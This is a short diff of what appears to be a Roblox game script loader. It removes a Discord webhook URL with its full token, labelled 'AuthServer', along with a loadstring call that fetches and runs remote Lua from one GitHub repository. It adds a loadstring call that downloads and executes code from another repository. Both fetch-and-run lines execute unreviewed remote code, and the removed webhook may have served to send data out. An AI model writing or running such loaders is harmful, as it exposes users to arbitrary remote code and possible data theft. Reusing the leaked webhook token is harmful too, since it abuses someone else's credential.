@@ -1,3 +1,1 @@
-_G.Key = "silxov"
-_G.AuthServer = "https://discordapp.com/api/webhooks/1052256594320166953/tH29dprEj_q-G0GF7rckd-L8_lT74ePyWXccL7kgVnlhRsw8GYWO2ZJZC_2w4d9UCj-d"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Main.lua"))()
